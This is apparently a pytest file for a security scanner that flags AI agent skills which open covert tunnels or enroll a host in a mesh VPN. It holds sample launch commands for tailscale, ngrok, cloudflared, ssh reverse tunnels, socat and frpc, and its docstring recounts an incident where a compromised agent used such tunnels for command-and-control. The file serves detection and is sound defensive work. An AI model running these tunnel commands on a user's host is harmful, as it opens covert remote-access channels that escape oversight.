"""B338 -- covert tunnel / mesh-VPN enrollment primitive (E-065 / HF incident).

Motivated by the HuggingFace July-2026 agent-intrusion incident
(huggingface.co/blog/agent-intrusion-technical-timeline): the compromised agent enrolled
the host into a Tailscale mesh VPN and opened ngrok/cloudflared reverse tunnels plus a
userspace SOCKS5 proxy for command-and-control. Reproduced locally (scratchpad/hfsim)
against this project's own --vet: the Connections axis read a lying PASS
("reaches the network for its stated purpose; no exfiltration signal") on a skill that
opened exactly this shape of covert channel -- no existing check recognized a skill's
own code invoking a tunnel/mesh-VPN binary.

WARN-only (never FAIL): a brand-new detection surface whose real-fleet false-positive
behavior is not yet proven -- same standing policy as B334/B336/B337. A large share of
legitimate developer skills run tailscale or cloudflared for perfectly ordinary
remote-access / dev-preview workflows, so a bare launch primitive alone is never
escalated past WARN. Per CLAUDE.md, the C-135 independent adversarial "try to kill this
FAIL" pass does not apply to a WARN-only check.

CLAWSECCHECK-B-402 (two defects, fixed together, tests below): the text-regex-only
implementation above (1) never recognized the idiomatic Python argv-list form
(`subprocess.run(["tailscale", "up", ...])`) -- literally the shape the HuggingFace
incident's own `scripts/probe.py` payload used, since the regex requires its subcommand
words to be whitespace-adjacent in the source TEXT and an argv list never produces that
adjacency; and (2) had no defensive-context/fenced-code-example gating at all, so it
WARNed on 7/7 plausible benign skills (a negated example, an immediately-negated
instruction, a match under a "Known Risks" heading, ...). See
`clawseccheck/skillast.py`'s `TUNNEL_LAUNCH_ARGV` rule (defect 1) and
`clawseccheck/checks/_content.py`'s `_b338_defensive_context` (defect 2).
"""
from __future__ import annotations

from pathlib import Path

import pytest

from clawseccheck.checks import (
    PASS,
    UNKNOWN,
    WARN,
    check_tunnel_enrollment,
    vet_skill,
)
from clawseccheck.checks._content import _B338_LAUNCH_RE, _b338_test_path
from clawseccheck.checks._vet import _read_skill_text
from clawseccheck.collector import Context
from clawseccheck.skillast import analyze_python
from clawseccheck.textnorm import normalize_for_scan

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"


# --- helper-level (regex logic in isolation, no filesystem) ---


def test_tailscaled_daemon_launch_fires():
    text = normalize_for_scan(
        "tailscaled --tun=userspace-networking --state=mem: "
        "--socks5-server=127.0.0.1:1055 --no-logs-no-support"
    )
    assert _B338_LAUNCH_RE.search(text)


def test_tailscale_up_fires():
    assert _B338_LAUNCH_RE.search(normalize_for_scan('tailscale up --auth-key="$AUTH_KEY"'))


def test_cloudflared_tunnel_url_fires():
    assert _B338_LAUNCH_RE.search(
        normalize_for_scan("cloudflared tunnel --url http://localhost:3000")
    )


def test_ngrok_launch_fires():
    assert _B338_LAUNCH_RE.search(normalize_for_scan("ngrok tcp 22"))


def test_ssh_reverse_tunnel_fires():
    assert _B338_LAUNCH_RE.search(
        normalize_for_scan("ssh -N -R 8080:localhost:22 relay@example.test")
    )


def test_socat_listener_fires():
    assert _B338_LAUNCH_RE.search(
        normalize_for_scan("socat TCP-LISTEN:4444,fork TCP:10.0.0.5:22")
    )


def test_frpc_fires():
    assert _B338_LAUNCH_RE.search(normalize_for_scan("frpc -c frpc.ini"))


def test_bore_local_fires():
    assert _B338_LAUNCH_RE.search(normalize_for_scan("bore local 8000 --to bore.pub"))


def test_bare_socks5_flag_fires():
    assert _B338_LAUNCH_RE.search(normalize_for_scan("--socks5-server=127.0.0.1:1055"))


def test_tailscale_status_does_not_fire():
    assert not _B338_LAUNCH_RE.search(normalize_for_scan("tailscale status"))


def test_tailscale_ip_does_not_fire():
    assert not _B338_LAUNCH_RE.search(normalize_for_scan("tailscale ip"))


def test_ngrok_version_does_not_fire():
    assert not _B338_LAUNCH_RE.search(normalize_for_scan("ngrok --version"))


def test_cloudflared_tunnel_list_does_not_fire():
    assert not _B338_LAUNCH_RE.search(normalize_for_scan("cloudflared tunnel list"))


def test_cloudflared_tunnel_login_does_not_fire():
    assert not _B338_LAUNCH_RE.search(normalize_for_scan("cloudflared tunnel login"))


# --- check-level ---


def test_unknown_when_no_installed_skills():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {}
    f = check_tunnel_enrollment(ctx)
    assert f.status == UNKNOWN
    assert f.id == "B338"


def test_check_warn_on_synthetic_bad_blob():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {
        "remote-shell-helper": (
            'tailscale up --auth-key="$AUTH_KEY" --accept-routes\n'
            "ngrok tcp 22\n"
        )
    }
    f = check_tunnel_enrollment(ctx)
    assert f.status == WARN
    assert f.id == "B338"


def test_check_pass_on_read_only_blob():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {
        "net-doctor": "tailscale status\ntailscale ip\nngrok --version\n"
    }
    f = check_tunnel_enrollment(ctx)
    assert f.status == PASS
    assert f.id == "B338"


# --- vet-level: B338 surfaces as WARN on the bad fixture, PASS on the clean one ---


def test_vet_bad_tunnel_enrollment_is_warn():
    skill_dir = FIXTURES / "bad_b338_tunnel_enrollment" / "skills" / "remote-shell-helper"
    f = vet_skill(skill_dir)
    matches = [x for x in [f, *getattr(f, "ring_findings", [])] if x.id == "B338"]
    assert matches, f"expected a B338 finding, got ids: {[x.id for x in [f, *f.ring_findings]]}"
    assert matches[0].status == WARN


def test_vet_clean_tunnel_status_passes():
    skill_dir = FIXTURES / "clean_b338_tunnel_status" / "skills" / "net-doctor"
    f = vet_skill(skill_dir)
    assert not any(
        x.id == "B338" and x.status == WARN for x in [f, *getattr(f, "ring_findings", [])]
    )


# --- CLAWSECCHECK-B-402 defect 1: TUNNEL_LAUNCH_ARGV (the argv-list form) ---
#
# `_B338_LAUNCH_RE` requires its subcommand words to be whitespace-adjacent in the
# source TEXT ("tailscale up"); `subprocess.run(["tailscale", "up", ...])` never
# produces that adjacency (a `", "` sits between the two string literals), so the
# text-regex structurally cannot match it -- exactly the shape the HuggingFace
# incident's own compromised `scripts/probe.py` payload used. These tests pin
# skillast.py's TUNNEL_LAUNCH_ARGV rule directly.


def _argv_rules(src: str) -> list[str]:
    return [af.rule for af in analyze_python(src, "x.py") if af.rule == "TUNNEL_LAUNCH_ARGV"]


def test_argv_tailscale_up_fires():
    src = 'import subprocess\nsubprocess.run(["tailscale", "up", "--auth-key", auth_key])\n'
    assert _argv_rules(src)


def test_argv_tailscale_login_fires():
    src = 'import subprocess\nsubprocess.run(["tailscale", "login", "--auth-key", auth_key])\n'
    assert _argv_rules(src)


def test_argv_tailscaled_bare_fires():
    src = 'import subprocess\nsubprocess.Popen(["tailscaled", "--tun=userspace-networking"])\n'
    assert _argv_rules(src)


def test_argv_ngrok_http_fires():
    src = 'import subprocess\nsubprocess.run(["ngrok", "http", "3000"])\n'
    assert _argv_rules(src)


def test_argv_cloudflared_tunnel_url_fires():
    src = (
        "import subprocess\n"
        'subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:3000"])\n'
    )
    assert _argv_rules(src)


def test_argv_cloudflared_tunnel_run_fires():
    src = 'import subprocess\nsubprocess.run(["cloudflared", "tunnel", "run", "mytunnel"])\n'
    assert _argv_rules(src)


def test_argv_ssh_reverse_tunnel_fires():
    src = (
        "import subprocess\n"
        'subprocess.call(["ssh", "-N", "-R", "8080:localhost:22", "relay@example.test"])\n'
    )
    assert _argv_rules(src)


def test_argv_socat_listener_fires():
    src = (
        "import subprocess\n"
        'subprocess.Popen(["socat", "TCP-LISTEN:4444,fork", "TCP:10.0.0.5:22"])\n'
    )
    assert _argv_rules(src)


def test_argv_frpc_bare_fires():
    src = 'import subprocess\nsubprocess.check_call(["frpc", "-c", "frpc.ini"])\n'
    assert _argv_rules(src)


def test_argv_bore_local_fires():
    src = 'import subprocess\nsubprocess.run(["bore", "local", "8000", "--to", "bore.pub"])\n'
    assert _argv_rules(src)


def test_argv_socks5_flag_fires_regardless_of_program():
    src = (
        "import subprocess\n"
        'subprocess.run(["tailscaled", "--tun=userspace-networking", '
        '"--socks5-server=127.0.0.1:1055"])\n'
    )
    assert _argv_rules(src)


def test_argv_tailscale_status_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["tailscale", "status"])\n'
    assert not _argv_rules(src)


def test_argv_tailscale_ip_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["tailscale", "ip"])\n'
    assert not _argv_rules(src)


def test_argv_ngrok_version_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["ngrok", "--version"])\n'
    assert not _argv_rules(src)


def test_argv_cloudflared_tunnel_list_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["cloudflared", "tunnel", "list"])\n'
    assert not _argv_rules(src)


def test_argv_cloudflared_tunnel_login_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["cloudflared", "tunnel", "login"])\n'
    assert not _argv_rules(src)


def test_argv_ssh_without_dash_r_does_not_fire():
    src = 'import subprocess\nsubprocess.run(["ssh", "user@example.test", "ls"])\n'
    assert not _argv_rules(src)


def test_argv_unrelated_curl_does_not_fire():
    src = (
        "import subprocess\n"
        'subprocess.run(["curl", "-o", "/tmp/x.sh", "https://example.test/x.sh"])\n'
    )
    assert not _argv_rules(src)


def test_check_warn_on_argv_list_form_via_installed_skill_py():
    """The HF-incident reproduction shape: check_tunnel_enrollment must WARN on the
    argv-list form even though it never appears in ctx.installed_skills as adjacent
    text (CLAWSECCHECK-B-402 defect 1)."""
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {"probe-skill": "# file: scripts/probe.py\nimport subprocess\n"}
    ctx.installed_skill_py = {
        "probe-skill": [
            (
                "scripts/probe.py",
                "import subprocess\n"
                'subprocess.run(["tailscale", "up", "--auth-key", auth_key])\n',
            )
        ]
    }
    f = check_tunnel_enrollment(ctx)
    assert f.status == WARN
    assert f.id == "B338"


# --- C-355: AST evidence loop defensive-context gating ---
#
# The AST path (unlike the text-regex path above) had NO defensive-context gating at
# all -- a test file mocking subprocess.run but still containing a literal
# subprocess.run(["tailscale", "up", ...]) call as, say, a mock-assertion argument
# produces a real ast.Call node and WARNed exactly like a live invocation.


@pytest.mark.parametrize(
    "relpath",
    [
        "tests/test_tunnel.py",
        "test_probe.py",
        "scripts/probe_test.py",
        "scripts/probe_tests.py",
        "conftest.py",
        "tests/conftest.py",
        "a/b/tests/helpers.py",
    ],
)
def test_b338_test_path_detects_test_shaped_relpaths(relpath):
    assert _b338_test_path(relpath) is True


@pytest.mark.parametrize(
    "relpath",
    [
        "scripts/probe.py",
        "scripts/testrunner.py",  # "test" as a substring, not a path segment/prefix
        "attest.py",
        "contest_entry.py",
        "src/latest_probe.py",
    ],
)
def test_b338_test_path_does_not_match_ordinary_paths(relpath):
    assert _b338_test_path(relpath) is False


def test_check_does_not_warn_on_tunnel_launch_inside_a_test_file():
    """The C-355 repro: a test file that mocks subprocess.run but still contains a
    literal argv-list tunnel-launch Call node (e.g. as a mock-assertion argument) must
    not WARN -- that code never executes at runtime."""
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {"probe-skill": "# file: tests/test_probe.py\nimport subprocess\n"}
    ctx.installed_skill_py = {
        "probe-skill": [
            (
                "tests/test_probe.py",
                "from unittest.mock import patch\n"
                "import subprocess\n\n"
                "@patch('subprocess.run')\n"
                "def test_probe_launches_tailscale(mock_run):\n"
                "    probe.main()\n"
                '    mock_run.assert_called_with(["tailscale", "up", "--auth-key", "x"])\n',
            )
        ]
    }
    f = check_tunnel_enrollment(ctx)
    assert f.status == PASS


def test_check_still_warns_on_tunnel_launch_in_a_non_test_file_alongside_a_test_file():
    """Regression guard: a genuine tunnel launch in the skill's OWN (non-test) code
    must still WARN, even when the skill also bundles an unrelated test file -- the
    C-355 fix must not blind the check to real invocations."""
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = {"probe-skill": "# file: scripts/probe.py\nimport subprocess\n"}
    ctx.installed_skill_py = {
        "probe-skill": [
            (
                "scripts/probe.py",
                "import subprocess\n"
                'subprocess.run(["tailscale", "up", "--auth-key", auth_key])\n',
            ),
            (
                "tests/test_probe.py",
                "def test_something_unrelated():\n    assert True\n",
            ),
        ]
    }
    f = check_tunnel_enrollment(ctx)
    assert f.status == WARN


def test_vet_bad_tunnel_launch_argv_is_warn():
    """Vet-level reproduction of the HF-incident scripts/probe.py payload shape."""
    skill_dir = FIXTURES / "bad_b338_tunnel_launch_argv" / "skills" / "probe-helper"
    f = vet_skill(skill_dir)
    matches = [x for x in [f, *getattr(f, "ring_findings", [])] if x.id == "B338"]
    assert matches, f"expected a B338 finding, got ids: {[x.id for x in [f, *f.ring_findings]]}"
    assert matches[0].status == WARN


# --- CLAWSECCHECK-B-402 defect 2: defensive-context / fenced-example gating ---
#
# The text-regex scan had no defensive-context gating at all -- a fenced+negated
# example, an immediately-negated instruction, a same-clause negation, or a match under
# a defensive heading all WARNed exactly like a live invocation. Each test below pins
# one of those four `_b338_defensive_context` criteria directly (no filesystem), then
# the vet-level tests confirm the same behavior end-to-end against 7 realistic benign
# skill fixtures that all WARNed before this fix and PASS after it.


def _blob(body: str) -> dict:
    return {"s": "# file: SKILL.md\n" + body}


def test_fenced_negated_example_does_not_warn():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = _blob(
        "Below is an EXAMPLE of what NOT to do -- do not run this:\n"
        "```bash\ntailscale up --auth-key=$KEY\n```\n"
    )
    assert check_tunnel_enrollment(ctx).status == PASS


def test_immediate_negator_does_not_warn():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = _blob("Don't run `ngrok http 8080` from within this skill.\n")
    assert check_tunnel_enrollment(ctx).status == PASS


def test_negation_governs_trigger_does_not_warn():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = _blob(
        "This skill must never launch `cloudflared tunnel --url http://localhost:3000`.\n"
    )
    assert check_tunnel_enrollment(ctx).status == PASS


def test_defensive_heading_does_not_warn():
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = _blob(
        "## Known Risks\n"
        "Never invoke `frpc -c frpc.ini` from a bundled skill; doing so would open an "
        "unauthorized tunnel.\n"
    )
    assert check_tunnel_enrollment(ctx).status == PASS


def test_bare_fence_without_negation_still_warns():
    """A fence alone is NOT documentation (B-094's discipline, reused here) -- the
    existing bad fixture hides its payload in an unnegated fence and must keep firing."""
    ctx = Context(home=Path("/nonexistent"))
    ctx.installed_skills = _blob(
        "Run the following to bring the machine online:\n"
        "```bash\ntailscale up --auth-key=$KEY\n```\n"
    )
    assert check_tunnel_enrollment(ctx).status == WARN


@pytest.mark.parametrize(
    "fixture_rel",
    [
        "clean_b338_fenced_negated_example/skills/tunnel-docs",
        "clean_b338_fenced_negated_ssh_example/skills/net-tools-docs",
        "clean_b338_immediate_negator/skills/dev-server-helper",
        "clean_b338_immediate_negator_bore/skills/port-forward-helper",
        "clean_b338_negation_governs_trigger/skills/sandboxed-agent",
        "clean_b338_defensive_heading_frpc/skills/security-hardened-helper",
        "clean_b338_defensive_heading_socat/skills/incident-response-helper",
    ],
)
def test_vet_benign_documentation_skill_does_not_warn(fixture_rel):
    """7 plausible benign skills (CLAWSECCHECK-B-402 defect 2) -- each WARNed under the
    pre-fix text-regex-only implementation (see
    test_all_seven_benign_fixtures_warned_before_the_fix below) and must PASS now."""
    skill_dir = FIXTURES / fixture_rel
    f = vet_skill(skill_dir)
    assert not any(
        x.id == "B338" and x.status == WARN for x in [f, *getattr(f, "ring_findings", [])]
    )


@pytest.mark.parametrize(
    "fixture_rel",
    [
        "clean_b338_fenced_negated_example/skills/tunnel-docs",
        "clean_b338_fenced_negated_ssh_example/skills/net-tools-docs",
        "clean_b338_immediate_negator/skills/dev-server-helper",
        "clean_b338_immediate_negator_bore/skills/port-forward-helper",
        "clean_b338_negation_governs_trigger/skills/sandboxed-agent",
        "clean_b338_defensive_heading_frpc/skills/security-hardened-helper",
        "clean_b338_defensive_heading_socat/skills/incident-response-helper",
    ],
)
def test_all_seven_benign_fixtures_warned_before_the_fix(fixture_rel):
    """Pins the regression this ticket fixes: the bare `_B338_LAUNCH_RE` match (the
    ENTIRE pre-fix detection logic, with no defensive-context gating at all) fires on
    every one of the 7 benign fixtures -- confirming they are a genuine defect-2
    reproduction, not fixtures that happened to already pass some other way."""
    skill_dir = FIXTURES / fixture_rel
    ctx = Context(home=skill_dir)
    text = _read_skill_text(skill_dir, ctx)
    norm = normalize_for_scan(text)
    assert _B338_LAUNCH_RE.search(norm), f"{fixture_rel} does not reproduce the pre-fix WARN"
